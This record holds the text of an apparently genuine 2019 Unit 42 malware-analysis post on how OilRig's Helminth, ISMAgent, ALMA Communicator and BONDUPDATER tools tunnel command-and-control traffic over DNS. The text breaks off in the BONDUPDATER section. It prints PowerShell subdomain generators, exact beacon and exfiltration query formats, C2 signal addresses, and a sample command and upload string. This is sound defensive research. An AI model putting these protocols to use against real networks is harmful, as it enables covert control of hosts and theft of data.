{
    "id": "8338fbd2-fcb2-41e7-9143-926902071979",
    "created_at": "2023-01-12T15:08:14.678445Z",
    "updated_at": "2025-03-27T02:17:27.538391Z",
    "deleted_at": null,
    "sha1_hash": "824e416fd635fca278256256040bcb0b6c78a7d3",
    "title": "2019-04-16 - DNS Tunneling in the Wild- Overview of OilRig’s DNS Tunneling",
    "authors": "",
    "file_creation_date": "2022-05-28T00:35:26Z",
    "file_modification_date": "2022-05-28T00:35:26Z",
    "file_size": 4225147,
    "plain_text": "# DNS Tunneling in the Wild: Overview of OilRig’s DNS Tunneling\n\n**[unit42.paloaltonetworks.com/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/](https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/)**\n\nRobert Falcone April 16, 2019\n\nBy [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nApril 16, 2019 at 9:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [ALMA Communicator,](https://unit42.paloaltonetworks.com/tag/alma-communicator/) [BONDUPDATER,](https://unit42.paloaltonetworks.com/tag/bondupdater/) [dns tunneling,](https://unit42.paloaltonetworks.com/tag/dns-tunneling/) [Helminth,](https://unit42.paloaltonetworks.com/tag/helminth/) [ISMAgent,](https://unit42.paloaltonetworks.com/tag/ismagent/) [OilRig,](https://unit42.paloaltonetworks.com/tag/oilrig/)\n[QUADAGENT](https://unit42.paloaltonetworks.com/tag/quadagent/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/)\n\n[On March 15, Unit 42 published a blog providing an overview of DNS tunneling and how malware](https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/)\ncan use DNS queries and answers to act as a command and control channel. To supplement this\nblog, we have decided to describe a collection of tools that rely on DNS tunneling used by an\nadversary known as OilRig.\n\nUnit 42 has been tracking the OilRig threat group since early 2016, which has resulted in over a\ndozen blogs describing various attacks carried out by this adversary. We have been covering the\nvarious tools OilRig uses in their operations, many of which rely on DNS tunneling to communicate\nbetween infected hosts and their command and control (C2) server. The repeated use of DNS\ntunneling clearly represents one of their preferred communication methods; therefore, we chose to\npublish an overview of OilRig’s tools that use various DNS tunneling protocols. A high-level analysis\nof the tunneling protocols used by these tools suggests:\n\nAll subdomains contain a randomly generated value to avoid the DNS query resulting in a\ncached response\nMost rely on an initial handshake to obtain a unique system identifier\nMost rely on hardcoded IP addresses within the DNS answers to start and stop data transfer\nData upload includes a sequence number that allows the C2 to reconstruct the uploaded data\nin the correct order\nDepending on the tool, A, AAAA, and TXT query types have been used by OilRig for tunneling\nAll of the DNS tunneling protocols will generate a significant number of DNS queries\n\nThis blog will dive deep into the DNS tunneling protocols used by OilRig’s tools Helminth, ISMAgent,\nALMACommunicator, BONDUPDATER, and QUADAGENT. Each of these tools use DNS queries\nand the answers to these queries to communicate back and forth with its C2 server. Not only will this\nblog discuss the structure of the queries and the responses, but it will also show these protocols in\naction with screenshots of Wireshark displaying how the tunnels would look within a packet capture.\n\n## Tool Overview\n\n\n-----\n\nOilRig delivered Trojans that use DNS tunneling for command and control in attacks since at least\nMay 2016. Since May 2016, the threat group has introduced new tools using different tunneling\nprotocols to their tool set. Figure 1 shows a timeline of when OilRig first used each of the 5 tools and\ntheir sub-variants in attacks, based on our visibility.\n\n_Figure 1. Timeline of OilRig introducing DNS tunneling tools_\n\nRegardless of the tool, all of the DNS tunneling protocols use DNS queries to resolve specially\ncrafted subdomains to transmit data to the C2 and the answers to these queries to receive data from\n[the C2. Therefore, the protocols must abide by the DNS protocol, so the specially crafted](https://www.ietf.org/rfc/rfc1035.txt)\nsubdomains must have labels (portions of the subdomain separated by periods) must start and end\nwith a letter or digit, contain letters, digits and hyphens and be less than 63 characters in length.\nAlso, the entire domain queried, which includes the C2 domain and the specially crafted subdomain\ncannot exceed 253 characters.\n\nThe protocol used by each of the five tools to communicate with its C2 via DNS tunneling differ in\nmany ways. First, the structure of the subdomains queried that the tools use to transmit information\nto the C2 differ. Next, the structure of the data received by the Trojans from the C2 in the answers to\nthe DNS queries differ as well. The structure of the subdomains used to transmit data differ\ndramatically, both in the amount of data included and the encoding used to represent the data. The\ntwo encoding methods used by these tools to transmit data within the subdomains included base16\nand base64 encoded data. The encoding method greatly impacts the amount of data the tool is able\nto transmit in the subdomain of each query, as base16 requires 2 ASCII characters to represent each\nbyte of data, so each character byte within the subdomain can transmit half (.5) a byte of data.\n\n\n-----\n\nCompare this with the use of base64 to encode the data, in which each character of base64 encoded\ndata in the subdomain represents 6-bits (.75 bytes) of the data. This makes the base64 encoding\nmore effective from a transmission throughput perspective.\n\nThe DNS query type used by the Trojan for its tunnel greatly effects the amount of data that the C2\ncan transmit to the Trojan for each query. For instance, the tools that issue DNS A queries transmit\ndata via IPv4 addresses within the answers, so the C2 is only able to transmit 4-bytes per query,\nwhereas tools using AAAA queries can transmit 16-bytes within the IPv6 answer. Table 1 shows the\ntools and their variants covered in this blog with a focus on the number of bytes of data the C2 can\nprovide per query, the amount of characters used in the specially crafted subdomain, the\ncorresponding amount of data bytes sent per query and the encoding format used to transmit the\ndata. The table below shows that QUADAGENT can transmit the most amount of data per query, as\nit has 60 characters within its subdomain to transmit base64 encoded data, meaning each query can\ntransmit 45 (60*.75 = 45) bytes of data. The table also shows that the updated version of\nBONDUPDATER can download the most amount of bytes per query, as the C2 can provide 186.75\nbytes of data thanks to the 255-byte maximum size for TXT queries and the C2 providing base64\nencoded data after a 6 character sequence number ((255-6)*.75 = 186.75), which will be discussed\nlater in this blog.\n\n\n**Tool** **Bytes**\n**received per**\n**query**\n\n\n**Characters for**\n**data per query**\n\n\n**Data bytes**\n**sent per**\n**query**\n\n\n**Data encoding**\n**in subdomain**\n\n\nHelminth 4 48 24 Base16\n\nISMAGENT 16 13 9.75 Base64\n\n\nALMA\nCommunicator\n\n\nDash 4 20 10 Base16\n\n\nDot 4 60 30\n\nBONDUPDATER Original 3 50 25 Base16\n\nUpdated 186.75 60 30\n\nQUADAGENT 16 60 45 Base64\n\n_Table 1. Throughput and encoding used by OilRig's tools using DNS tunneling_\n\nAnother difference seen amongst the tools involves the type of DNS queries used to transmit and\nreceive data, with each of the tools using DNS A, AAAA or TXT queries. Lastly, how the Trojan\nissues DNS queries differs as well. Depending on the tool, DNS queries could be issued using the\nbuilt-in ‘nslookup’ application, using methods within the “UdpClient” class, using methods\n“GetHostByName” and “GetHostAddresses” from the ‘DNS’ class, or using the DnsQuery API\nfunctions within the ‘Dnsapi’ library. Table 2 includes the five tools covered in this blog, which shows\nseveral different DNS query types used for the tunneling protocol and different functions used by the\ntools to issue the DNS requests. Also, the example C2 domain column provides the domain name\nonce used by OilRig to host a C2 server for the associated tool.\n\n\n-----\n\n**Tool** **DNS**\n**Type**\n\n\n**DNS Query method** **Example C2 domain**\n\n\nHelminth A [System.Net.DNS]::GetHostByName go0gie[.]com\n\nISMAgent AAAA DnsQuery_A ntpupdateserver[.]com\n\nALMACommunicator A DnsQuery_W prosalar[.]com\n\n\nBONDUPDATER A,\nTXT\n\n\n\n[System.Net.Dns]::GetHostAddresses,\nSystem.Net.Sockets.UdpClient\n\n\npoison-frog[.]club,\nwithyourface[.]com\n\n\nQUADAGENT AAAA nslookup.exe, Resolve-DnsName acrobatverify[.]com\n\n_Table 2. DNS type and query method used by OilRig's tools using DNS tunneling for C2_\n\nIn the upcoming sections, we will provide an in-depth analysis of the DNS tunneling protocols used\nby each of OilRig’s tools.\n\n## Helminth\n\nThere are several variants of Helminth, as the OilRig actors actively developed this Trojan during the\ncourse of their attack campaigns. The Helminth Trojan came in two forms, a portable executable\nversion and a PowerShell version, both of which received updates to their DNS tunneling protocol\nover time. The DNS tunneling protocols used in each variant operated the same way, but the\ndeveloper would make changes to the generated subdomains to make them look visually different to\nevade detection.\n\nFor instance, Figures 2, 3 and 4 below show the subdomain generation function used in three\nvariants of PowerShell Helminth, which effectively generate the subdomains with the same structure,\nbut the first two characters differ from “00”, “zz” and “ww”. While the portable executable and\nPowerShell variants of Helminth generate different subdomains for their DNS tunneling, in this\nsection we will focus on the PowerShell variant as it is easier to visualize.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nfunction GetSub($myflag2, $cmdid='00', $partid='000')\n\n{\n\nif($myflag2 -eq 0)\n\n{\n\n('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))\n\n}\n\nelseif($myflag2 -eq 1)\n\n{\n\n('00'+$global:myid+'00000'+(convertTo-Base36(Get-Random -Maximum 46655)))\n\n}\n\nelseif($myflag2 -eq 2)\n\n{\n\n('00'+$global:myid+$cmdid+$partid+(convertTo-Base36(Get-Random -Maximum 46655)))\n\n}\n\n}\n\n\n_Figure 2. Code in Helminth \"00\" variant used to generate subdomains_\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nfunction GetSub($myflag3, $cmdid='00', $partid='000')\n\n{\n\nif($myflag3 -eq 0)\n\n{\n\n('ww000000'+(convertTo-Base36(Get-Random -Maximum 46655)))\n\n}\n\nelseif($myflag3 -eq 1)\n\n{\n\n('ww'+$global:myid+'00000'+(convertTo-Base36(Get-Random -Maximum 46655)))\n\n}\n\nelseif($myflag3 -eq 2)\n\n{\n\n('ww'+$global:myid+$cmdid+$partid+(convertTo-Base36(Get-Random -Maximum 46655)))\n\n}\n\n}\n\n\n_Figure 3. Code in Helminth \"zz\" variant used to generate subdomains_\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nfunction GetSub($myflag2, $cmdid='00', $partid='000')\n\n{\n\nif($myflag2 -eq 0)\n\n{\n\n('zz000000'+(convertTo-Base36(Get-Random -Maximum 46655)));\n\n}\n\nelseif($myflag2 -eq 1)\n\n{\n\n('zz'+$global:myid+'00000'+(convertTo-Base36(Get-Random -Maximum 46655)));\n\n}\n\nelseif($myflag2 -eq 2)\n\n{\n\n('zz'+$global:myid+$cmdid+$partid+(convertTo-Base36(Get-Random -Maximum 46655)));\n\n}\n\n}\n\n\n_Figure 4. Code in Helminth \"ww\" variant used to generate subdomains_\n\nThe Helminth variant that uses “00” as the first characters of generated subdomains is the first\nvariant of this Trojan that we analyzed from an attack campaign on Saudi Arabian targets back in\nMay 2016. During the explanation of the DNS tunneling, the “00” variant will be the main focus, but\nas the figures above suggest, the “ww” and “zz” variants are exactly the same just using different\ncharacters for the first two bytes of the subdomain.\n\nThe Helminth variant relies on DNS Type A requests to resolve custom crafted subdomains at the C2\ndomain to obtain IPv4 answers that it will ultimately parse and treat as data. It issues these DNS\nqueries using the GetHostByName method in the System.Net.DNS class. The Helminth tool will use\nthe downloaded data to create a batch script that it will run and upload the results to the C2 via the\nDNS tunnel. To carry out this activity, the Helminth tool looks for two hardcoded IP addresses within\nthe response to its initial DNS query.\n\n**IP Address** **Description**\n\n33.33.x.x Provides script filename and instructs the Trojan to start downloading data to save to\nthe batch script.\n\n35.35.35.35 Instructs the Trojan to stop downloading data and to execute the downloaded batch\nscript.\n\n\n-----\n\n_Table 3. IPv4 addresses used by Helminth for data transfer through the DNS tunnel_\n\nThe Helminth Trojan initiates the conversation with its C2 server by issuing a DNS query to resolve a\nspecial subdomain that acts as a beacon. The C2 will respond to this beacon with an IPv4 address in\nthe DNS answer that the Trojan will use to obtain a unique system identifier from the C2, specifically\nconverting the number in the first octet of the IPv4 to a character and using this character to uniquely\nidentify the system in subsequent DNS queries. The initial beacon to obtain a system identifier from\nthe C2 has the following structure:\n\n00000000<base36 encoded random number less than 46655><sequence number “30”>.<c2\ndomain>\n\nFigure 5 shows this initial beacon that includes the hardcoded string of eight zeros (“00000000”),\nfollowed by three characters for the base36 encoded random number and a sequence number of\n“30”, which represents the character “0”. Figure 5 also shows the C2 server providing an IPv4\naddress of “35.0.0.0” as the answer to the DNS request. This IP address instructs the Trojan use the\ncharacter “5” as a unique system identifier, as the number 35 represents the “5” character in ASCII.\nThe Trojan will use this identifier in subsequent queries that the C2 server will use to identify the\nsystem.\n\n_Figure 5 Initial beacon from Helminth and the C2 replying with a unique system identifier_\n\nThe next query includes the system identifier provided by the C2 as the third character in the\nsubdomain, followed by the base36 encoded random number and the sequence number “30”, which\nrepresents the character “0”. This query has the following structure, which reuses the “30” sequence\nnumber as the Trojan has not begun receiving data yet:\n\n00<system identifier>00000<base36 encoded random number less than 46655><sequence number\n“30”>.<c2 domain>\n\nThe C2 will respond to this query with an answer that contains an IPv4 address that is structured as\n“33.33.x.x”, which Helminth will treat the last two octets as integers (“x.x”) and converts them to\ncharacters to use as the name of the batch file used to store the downloaded script. Helminth will\nconcatenate the “.bat” file extension to these two characters to create the batch script and will begin\nissuing additional DNS queries and treat future IPv4 addresses in responses as data that it will write\nto this file. Figure 6 shows the query containing the system identifier and the C2 responding with an\nIPv4 answer of “33.33.97.97”, which Helminth will use “97.97” to create a file named “aa.bat”, as the\nnumber 97 represents the “a” character in ASCII.\n\n_Figure 6. C2 providing Helminth with the two character filename_\n\n\n-----\n\nTo download data from the C2, Helminth will issue DNS queries that have the following structure,\nwhich is similar to the previous query used to obtain the filename, however, these requests include a\nhardcoded string “232A” followed by the hexadecimal representation of the two characters used for\nthe filename:\n\n00<system identifier>00000<base 36 encoded random number less than 46655>232A<hexlified\ncharacters for filename><sequence number>.<c2 domain>\n\nThe C2 server will begin providing IPv4 addresses that the Trojan will treat each octet as the base10\nrepresentation of the binary data. The Trojan will write each byte to the batch file and continue to do\nso until the C2 provides the IPv4 address of “35.35.35[.]35” as a DNS answer, which instructs the\nTrojan to stop writing data to the file and run the file as a batch script.\n\nFigure 7 shows the C2 server providing the “33.33.97[.]97” IPv4 address instructing the Trojan to\ncreate a file name “aa.bat”. The screenshot then shows the Trojan issuing DNS queries with\nincrementing sequence numbers (“31”, “32” and “33” for 1, 2 and 3), which the C2 is responding with\ntwo IPv4 addresses to transmit the data (119.104.111[.]97 and 109.105.32[.]32 to transmit the string\n“whoami”) followed by the “35.35.35[.]35” address to end the data transmission.\n\n_Figure 7. Helminth requesting data from the C2 server until receiving the IPv4 35.35.35[.]35 to stop_\n_the data transfer_\n\nOnce it receives the “35.35.35[.]35” address, Helminth will run the downloaded batch script and save\nthe output of the script to a text file whose name has the same two characters as the batch script. For\ninstance, in the above example the Trojan would save the output of the “aa.bat” script to “aa.txt”. The\nTrojan will upload the contents of this text file to the C2 server via a series of DNS queries that have\nthe following structure:\n\n00<system identifier><characters for filename><sequence number><base 36 encoded random\nnumber less than 46655><up to 48 characters for a maximum of 24-bytes of hexlified data>.<c2\ndomain>\n\nThe Trojan splits the contents of the text file up into 24-byte chunks and converts each byte into its\nhexadecimal representation. Helminth will include the hexadecimal representation of these bytes\nwithin the subdomain and will issue a DNS query to transmit the data to the C2 server. The Trojan\nwill continue this process until all of the 24-byte chunks are sent to the C2, with each query including\nan incrementing sequence number. Helminth does nothing with the C2 server’s answer to these\nqueries, as it just makes sure the DNS server responded with any answer. Figure 8 shows the\nHelminth Trojan uploading the contents of the text file that contains the results of the batch script\n(“whoami” command) to the C2 server in a series of five DNS queries.\n\n\n-----\n\n_Figure 8. Helminth sending the results of the command within queried subdomains_\n\n## ISMAgent\n\nOilRig has used the ISMAgent tool in targeted attacks, one of which we publicly discussed in our blog\ntitled [OilRig Uses ISMDoor Variant; Possibly Linked to Greenbug Threat Group. OilRig’s use of this](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/)\ntool was an interesting discovery, as ISMAgent uses a DNS tunneling protocol very similar to another\ntool called ISMDoor that had been linked to another group called Greenbug. Researchers have\n[already explained ISMDoor’s tunneling protocol here, so we will focus on explaining ISMAgent’s DNS](https://www.netscout.com/blog/asert/greenbugs-dns-isms)\ntunneling protocol.\n\nISMAgent uses the DnsQuery_A API function to issue DNS AAAA requests to resolve custom crafted\nsubdomains at an actor owned domain to send data to and receive commands from OilRig. The\nTrojan will initiate data transfer by issuing a beacon that contains a unique session identifier\ngenerated by calling the CoCreateGuid API function and using the resulting GUID with its hyphens\nremoved. ISMAgent then uses this session identifier within a subdomain with the following structure\nthat it will attempt to resolve:\n\nn.n.c.<GUID used for session ID>.<c2 domain>\n\nISMAgent performs an AAAA query to resolve the domain, which effectively notifies the C2 that it is\nabout to send data. If the C2 is operational, it will respond to this beacon with an IPv6 address of\n‘a67d:0db8:a2a1:7334:7654:4325:0370:2aa3’ to acknowledge that it received the beacon and is\nready to handle the data ISMAgent will attempt to send it. After receiving the acknowledgment IPv6\nfrom the C2 server, the Trojan build a string that has the following structure:\n\nhttp://<IP of C2 domain>/action2/<base64 encoded computername\\username>||\n\nISMAgent will base64 encode the string above (converting “=”, “/” and “+” to “-“, “-s-“ and “-p-“\nrespectively) and then sends the encoded data to the C2 in a series DNS queries to resolve domains\nthat have the following structure:\n\n<up to 13 characters of base64 encoded data>.<iterating sequence number>.d.<GUID used for\nsession ID>.<c2 domain>\n\nThe C2 will respond with a hardcoded IPv6 of “a67d:0db8:85a3:4325:7654:8a2a:0370:7334” to tell\nthe Trojan that it received the data and to continue sending data. Once it has sent all the data to the\nC2 server, ISMAgent will issue a query to resolve a domain with the following structure to notify the\nC2 server it is done sending data:\n\nn.<number of queries issued to send data>.f.<GUID used for session ID>.<c2 domain>\n\n\n-----\n\nFigure 9 shows Wireshark displaying the ISMAgent beacon followed by the Trojan sending data to\nthe C2 server. Figure 9 also shows that the C2 uses very specific IPv6 addresses as answers to the\nqueries, specifically including the IPv6 addresses used for acknowledgement and to instruct the\nTrojan to continue sending data. Lastly, the screenshot shows a third IPv6 used to answer the last\nDNS query, which the Trojan will use to determine how many DNS requests it needs to issue to\ndownload data from the C2.\n\n_Figure 9. ISMAgent's initial beacon followed by the transfer of system data “action2” in the queried_\n_subdomains_\n\nFigure 9 showed the C2 server providing an IPv6 address as an answer to the query that ISMAgent\nissued to mark the completion of data transfer. ISMAgent will parse this IPv6 to make sure it starts\nwith “a67d:0db8:85a3:4325:7654” and then uses the last two hexadectets as a number of DNS\nqueries it should issue to download data from the C2 server. The Trojan will issue queries to resolve\ndomains with the following structure and treats the IPv6 addresses in the answers as data:\n\nwww.<sequence number [0:count from C2 server-1]>.r.<GUID used for session ID>.<c2 domain>\n\nFigure 10 shows the C2 server responding to a query with an IPv6 address that begins with\n“a67d:0db8:85a3:4325:7654” and ends with 11, which instructs ISMAgent to issue 11 DNS queries to\ndownload data. The screenshot then shows ISMAgent issuing 11 DNS requests that the C2 server\nresponds with data structured as follows:\n\n<GUID used as a unique system identifier>#command#<URL to download a file>#<command to run\nwith cmd.exe>#<file to upload to c2>#\n\nIn Figure 10, the C2 provided IPv6 addresses that transmitted the following data to the ISMAgent\nTrojan, which would run a PowerShell script that writes text to a file “C:\\Users\\Public\\file.txt:\n\n2983b983-0acd-42db-9d86-0b096af5f369#command##powershell.exe -executionpolicy bypass \\\"$s\n= 'Text written to file.txt';$s | set-content 'c:\\\\Users\\\\Public\\\\file.txt'\\\"#\n\n\n-----\n\n_Figure 10. ISMAgent downloading data from the C2 within IPv6 answers that the Trojan will treat as a_\n_command_\n\nThe next beacon sent by ISMAgent follows the same process as the initial beacon, including the\nquery to resolve “n.n.c” followed by the data transfer requests with the base64 encoded data in the\nsubdomain and finishing with the “n.<requests sent>.f” query. The data transferred differs from the\ninitial beacon, as it includes the GUID provided by the C2 in the previous beacon and the URL\ncontains the word “response” instead of “action2”. The data sent to the C2 has the following\nstructure, which the word “response” notifies the C2 that it is responding the previous transmission of\nthe GUID:\n\nhttp://<IP of c2 domain>/response/<base64 encoded computername\\username>/<GUID provided by\nC2 as a unique system identifier>||\n\nFigure 11 shows the DNS requests that ISMAgent issues to send this data to the C2 server. As you\ncan see from the query to resolve the “n.12.f.” subdomain, ISMAgent sent 12 queries to transmit the\nencoded data to the C2 server via the DNS tunnel.\n\n_Figure 11. ISMAgent sending data “response” to the C2 server within queried subdomains_\n\nTo show how ISMAgent exfiltrates data from the system, we issued the following command from the\nC2 server:\n\n\n-----\n\n2983b983-0acd-42db-9d86-0b096af5f369#command###C:\\\\Users\\\\Public\\\\file.txt\n\nThe C2 issues this command within IPv6 addresses provided as answers to five queries seen in\nFigure 12. The command instructs ISMAgent to read the “C:\\Users\\Public\\file.txt” file and upload its\ncontents to the C2 server. If you recall, the string “Text written to file.txt” was written to this file from\nthe PowerShell script executed by the initial command issued by the C2 server in Figure 11 above.\n\n_Figure 12. ISMAgent downloading data from the C2 within IPv6 addresses_\n\nISMAgent will read the file and send its contents to the C2 server via the same sequence of DNS\nqueries as before. The following shows the structure of the data uploaded, which is similar to but\ndiffers from previous data transferred, specifically including the string “upload” in the URL and the\ncontents of the uploaded file following the double pipe (“||”) characters.\n\nhttp://<IP of c2 domain>/upload/<base64 encoded computername\\username>/<GUID provided by C2\nas a unique system identifier>||<contents of file uploaded>\n\nFigure 13 shows ISMAgent uploading the contents of the “file.txt” file by sending the following data in\nencoded form to the C2 in 15 DNS queries:\n\nhttp://172.16.107[.]128/upload/V0lOLURQUUNPTkJMMU44XFJpY2sgRW5nbGlzaA%3d%3d/2983b9830acd-42db-9d86-0b096af5f369||Text written to file.txt\\r\\n\n\n_Figure 13. ISMAgent uploading data to the C2 via the queried subdomains_\n\n\n-----\n\n## ALMA Communicator\n\nWhile tracking OilRig, we observed the threat group delivering two different variants of a tool called\nALMA communicator as a payload. The two variants use DNS tunneling as its C2 channel, but the\nstructure of the domains generated differ enough to describe them separately.\n\n## ALMA dash\n\nThe dash variant of ALMA was the first ALMA Communicator variant we discovered and was the\n[focal point of our blog titled OilRig Deploys “ALMA Communicator” – DNS Tunneling Trojan. Like](https://unit42.paloaltonetworks.com/unit42-oilrig-deploys-alma-communicator-dns-tunneling-trojan/)\nother tools used by OilRig, ALMA uses two separate folders named “Download” and “Upload” to\nstore files that it receives from the C2 and to store files that it will exfiltrate to the C2. The ALMA dash\ntool will use a custom DNS tunneling protocol to download files provided by the C2 server and save\nthese files in the “Download” folder. ALMA dash will routinely check the contents of the second folder\nnamed “Upload” and use the custom DNS tunneling protocol to exfiltrate the contents of each file in\nthis folder.\n\nALMA dash’s custom DNS tunneling protocol relies on DNS A record queries to resolve custom\ncrafted subdomains at the actor controlled C2 domain. ALMA dash builds the subdomains and uses\nthe DnsQuery_W function to issue these DNS queries. OilRig transmits data via IPv4 addresses\nwithin the answers to these queries, which ALMA will save to the “Download” folder and execute\nusing CreateProcessA with the command line of “cmd /c <downloaded file>”. The results of the\ncommand are saved to a file in the “Upload” folder that ALMA will exfiltrate to the C2 server.\n\nALMA dash generates a unique identifier for the system by gathering the user name and windows\nproduct key and combining the two strings together with an underscore (“_”) between them. The\nTrojan obtains the username via the GetUserNameA function and gathers the Windows product id by\nquerying the registry, specifically the key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\nProductId. ALMA will then generate the MD5 hash for this string and use characters at specific\noffsets (offsets 1, 5, 9, 13, 17, 21, 25 and 29) in this MD5 hash to create an 8-character string that it\nwill use as the unique identifier for the system.\n\nWith the unique identifier created, ALMA dash initiates communications with the C2 server by\nsending a beacon to the C2 server using a DNS query to resolve a custom crafted subdomain at the\nactor-controlled C2 domain. ALMA issues these beacons to notify the C2 that it seeks to download\ndata.\n\n[random number between 1-9998]ID[unique identifier from MD5 hash of system information]\n\n[sequence number]-0-2D-2D.[C2 domain]\n\nFigure 14 shows the initial beacon sent from ALMA dash to its C2 server, including a random number\nof “6813”, a unique identifier of “8faa2150”, a sequence number of “0” and a hardcoded “-0-2D-2D\"\nstring used for the beacon.\n\n\n-----\n\n_Figure 14. ALMA Communicator s initial beacon to the C2_\n\nThe authoritative DNS server for the C2 domain will send data to ALMA dash within the IPv4\nanswers to the query. The DNS server will use a hardcoded IPv4 address of 36.37.94[.]33\n($%^!)within answer to instruct the Trojan to begin treating all future IPv4 addresses within answers\nas data. To obtain the entire data stream, ALMA dash will continue to issue queries to resolve\nsubdomains using the format above; however, ALMA will generate a new random number each\nquery to avoid caching. ALMA dash will continue to send queries until it receives the IPv4 address of\n33.33.94[.]94 (!!^^), which the C2 server will send when it is finished sending data. Figure 15 shows\nthe C2 server answering the ALMA beacon with an IPv4 address of “36.37.94[.]33” to tell the Trojan\nto begin treating subsequent IPv4 as data.\n\n_Figure 15. C2 server responds to ALMA's beacon with data in the IPv4 answers_\n\nThe Trojan will continue to treat the IPv4 addresses within the DNS query responses as data until the\nC2 server responds with the address of “33.33.94[.]94”. Figure 16 shows the C2 server providing\ndata in the form of IPv4 addresses until it the “33.33.94[.]94” address to terminate the data transfer.\n\n_Figure 16. ALMA continues to issue queries to download data from the C2 until it receives the_\n_33.33.94[.]94 IPv4 address_\n\nTo exfiltrate data from the system to the C2 server, ALMA dash variants will read the contents of the\nfiles in the “Uploads” folder and send their contents to the C2 via a series of DNS queries. The DNS\nqueries have a similar structure as the initial beacon, as these requests will start with a random\nnumber, the string “ID” and the unique identifier created based on the MD5 hash generated for the\nsystem information gathered by the Trojan. The differences include the hardcoded string of “0-2D2D\", which is no longer used but will be replaced by the following:\n\n**0 – This will contain the number of DNS queries the Trojan will request to transmit the entire data.**\n\n**2D – This will contain 20 or less characters that represent 10-bytes of data from the exfiltrated file in**\nhexadecimal format.\n\n\n-----\n\n**2D – This will contain 16 or less characters that represent the first 8-bytes of the filename being**\nexfiltrated in hexadecimal format.\n\nThe resulting structure for the data exfiltration queries is as follows:\n\n[random number between 1-9998]ID[unique identifier from MD5 hash of system information]-[number\nof requests needed to transfer data]-[20 characters or less for hexlified data]-[16 characters or less\nfor hexlified filename].[c2 domain]\n\nFigure 17 and 18 show ALMA communicator exfiltrating data via the DNS tunnel. The two\nscreenshots show the Trojan providing the number “29”, which is the total number of DNS queries it\nwill issue to transmit all of the data. The string “5F446E73496E6974” appears in each of the\nsubdomains, as it is the hexlified representation of the filename “_DnsInit”, which was the name of\nthe batch script provided by the C2 server and executed by the Trojan. The two screenshots show\nthe sequence number after the unique identifier “8faa2150” starting at “1” and incrementing up to “29”\nwhen transmitting the data to the C2 server.\n\n_Figure 17. ALMA beginning the exfiltration of data to the C2 in the queried subdomains_\n\n_Figure 18. ALMA finishing the exfiltration of data to the C2 in the queried subdomains_\n\n## ALMA dot\n\nThis variant of ALMA is very similar to the ALMA dash variant; however, the information sent to the\nC2 server and specific formatting of the data within the DNS tunneling protocol differ. In addition to\nthe user name and ProductId gathered by the dash variant of ALMA, the dot variant also gathers the\ncomputer name and the serial number of \"\\\\.\\PhysicalDrive\" and concatenates the system information\nusing an underscore (\"_\") to split up the fields. Like the dash variant, the dot variant generates the\nMD5 hash of the gathered information and uses it as a unique identifier, but instead of using a\nshortened version of this hash, the dot variant uses the entire MD5 hash as the unique identifier. The\ninitial beacon to the C2 is structured slightly differently than the dash variant and results in drastically\ndifferent subdomains, specifically having the following format:\n\n\n-----\n\n[random number between 1-9999999].MD5 hash for unique identifier].[sequence number].0.2D.2D.\n\n[c2 domain]\n\nFigure 19 shows a beacon generated by ALMA dot that contains a random number, the MD5 hash of\nthe generated system specific data used as an identifier and a sequence number of 0.\n\n_Figure 19. Beacon generated by ALMA dot_\n\nTo receive data from the C2, the Trojan will process the IPv4 addresses within the answers to the\nDNS query. Like, the dash variant, the dot variant of ALMA uses the following two IP addresses to\nmark the beginning and end of the data transmission:\n\nStart – 36.37.94.33 ($%^!)\n\nEnd – 33.33.94.94 (!!^^)\n\nFigure 20 shows the ALMA dot variant using the same IPv4 address of “36.37.94[.]33” to mark the\nbeginning of the data it will download from the C2 server, which in this case is the same batch script\n“_DnsInit.bat” as mentioned in the ALMA dash section.\n\n_Figure 20. ALMA dot using DNS tunnel to download a batch script from the C2 server_\n\nWhen exfiltrating data via the DNS tunnel, ALMA dot variant has a similar but different structure than\nthe dash variant and can transmit three times the amount of data per request. The following structure\nshows that the dot variant exfiltrates 60 characters of hexlified data (30 bytes) and another 60\ncharacters of hexlified data (30 bytes) that represents the filename that the data is exfiltrated from:\n\n[random number between 1-9999999](IDID|idid)[MD5 hash for unique identifier].[sequence number].\n\n[total count in sequence].[60 or less characters for hexlified data].[60 or less characters for hexlified\nfilename].[c2 domain]\n\nFigure 21 shows the ALMA dot variant exfiltrating the results of the batch script downloaded by the\nC2 server in the previous figure. The figure shows the queries containing a sequence number that\nincreases by one each query until it reaches 8, which is the value in the field in the subdomain that\nsignifies the total number of queries in the sequence. The following field contains 60 characters that\nrepresent 30 bytes of hexlified data that the Trojan is sending to the C2. The last field in the\nsubdomain is the hexadecimal string “5F446E73496E69742E747874” that decodes to “_DnsInit.txt”,\nwhich is the file that stored the results of the “_DnsInit.bat” script downloaded from the C2 server.\n\n\n-----\n\n_Figure 21. ALMA dot sending the output of the batch script via the DNS tunnel_\n\n## BONDUPDATER\n\nOilRig has used the BONDUPDATER tool in its attack campaigns as far back as mid-2017 according\nto [FireEye’s research. There were two known variants of BONDUPDATER prior to our discovery of a](https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html)\nnew variant of BONDUPDATER delivered in a targeted attack on a Middle Eastern government\n[organization in August 2018 that we blogged about here. The early variants of variants 